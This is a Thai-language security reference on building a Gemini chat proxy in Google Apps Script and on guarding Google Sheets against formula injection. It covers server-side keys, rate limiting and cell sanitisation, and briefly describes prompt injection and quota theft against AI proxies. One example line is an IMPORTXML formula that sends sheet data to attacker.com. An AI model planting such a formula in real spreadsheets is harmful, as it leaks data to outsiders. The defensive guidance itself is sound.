# Security, AI Proxy & Sheets Protection Reference

เอกสารนี้อธิบายมาตรฐานความปลอดภัยในการสร้าง AI Chat Proxy บน Google Apps Script และการบันทึกข้อมูลฟอร์มลง Google Sheets

---

## 1. มาตรการรักษาความปลอดภัยของ AI Chatbot (Gemini Proxy)

### ปัญหาที่พบบ่อยเมื่อสร้าง AI Chatbot บนเว็บสาธารณะ:
1. **API Key รั่วไหล**: หากเรียก Gemini จาก JavaScript ฝั่งหน้าเว็บ API Key จะถูกเปิดเผยใน Developer Tools
2. **Prompt Injection / Quota Theft**: หาก Client ส่ง System Prompt หรือเลือกโมเดลเองได้ ผู้ไม่หวังดีจะแอบใช้ Proxy ไปคุยเรื่องอื่นหรือสั่งการโมเดลแพงๆ จนโควต้าหมด

### สถาปัตยกรรมที่ปลอดภัย (Server-Side Construction)
```
[Client]                [Apps Script Server]               [Google Gemini API]
   │                             │                                  │
   │── POST {question, history} ─>│                                  │
   │                             │ 1. เช็กความยาวคำถาม (<= 1,000 char)│
   │                             │ 2. เช็ก Rate Limit (15 RPM)       │
   │                             │ 3. ดึง API Key จาก ScriptProperties│
   │                             │ 4. สังเคราะห์ System Prompt จาก    │
   │                             │    Data.js + chat-prompt.md เท่านั้น│
   │                             │                                  │
   │                             │── POST /v1beta/models/... ───────>│
   │                             │   { contents, systemInstruction }│
   │                             │<── JSON Response ─────────────────│
   │<── { ok: true, answer } ────│                                  │
```

### การตั้งค่าใน Apps Script (`Chat.js`)
* **API Key**: ดึงจาก Script Properties เท่านั้น:
  ```javascript
  var apiKey = PropertiesService.getScriptProperties().getProperty('GEMINI_API_KEY');
  ```
* **Rate Limiting ผ่าน CacheService**:
  ```javascript
  function throttleGemini_() {
    var cache = CacheService.getScriptCache();
    var key = 'gemini_rate_count';
    var count = parseInt(cache.get(key) || '0', 10);
    if (count >= 15) { // จำกัดสูงสุด 15 ครั้ง/นาที ทั่วทั้งระบบ
      throw new Error('ระบบ AI มีผู้ใช้งานหนาแน่น กรุณารอ 1 นาทีแล้วลองใหม่อีกครั้ง');
    }
    cache.put(key, String(count + 1), 60);
  }
  ```
* **Exponential Backoff**:
  หาก Gemini ตอบกลับด้วย HTTP 429 (Resource Exhausted) ให้สคริปต์หน่วงเวลาและลองใหม่ 2 ครั้ง (1.5s, 3s)

---

## 2. การป้องกัน Formula Injection ใน Google Sheets (`Feedback.js`)

### ความเสี่ยงของ Formula Injection (CSV/Sheet Injection)
หากผู้ใช้กรอกข้อความในแบบฟอร์ม Feedback เช่น:
```text
=IMPORTXML("https://attacker.com/steal?data=" & A1, "//a")
```
เมื่อเจ้าหน้าที่เปิดดู Google Sheet โปรแกรมจะคำนวณสูตรนั้นทันที และอาจส่งข้อมูลในตารางออกไปหาบุคคลภายนอก

### มาตรการป้องกัน (Sanitization)
ก่อนนำสตริงใดๆ ไปบันทึกใน Google Sheet ต้องตรวจสอบอักขระตัวแรก หากขึ้นต้นด้วยอักขระสั่งการของสูตร (`=`, `+`, `-`, `@`, `\t`, `\r`) ให้เติมเครื่องหมาย Single Quote (`'`) นำหน้าเสมอ:

```javascript
function sanitizeCell_(val) {
  if (val === null || val === undefined) return '';
  var str = String(val);
  if (/^[=+\-@\t\r]/.test(str)) {
    return "'" + str; // Google Sheets จะมองเป็นข้อความธรรมดา ไม่ประมวลผลสูตร
  }
  return str;
}
```

### การบันทึกแถวข้อมูลลงในชีต
```javascript
function handleFeedback(body) {
  var row = [
    new Date(),
    sanitizeCell_(body.type),
    sanitizeCell_(body.detail),
    sanitizeCell_(body.sender),
    sanitizeCell_(body.contact),
    sanitizeCell_(body.page)
  ];
  sheet.appendRow(row);
  return jsonOut_({ ok: true, message: 'บันทึกสำเร็จ' });
}
```
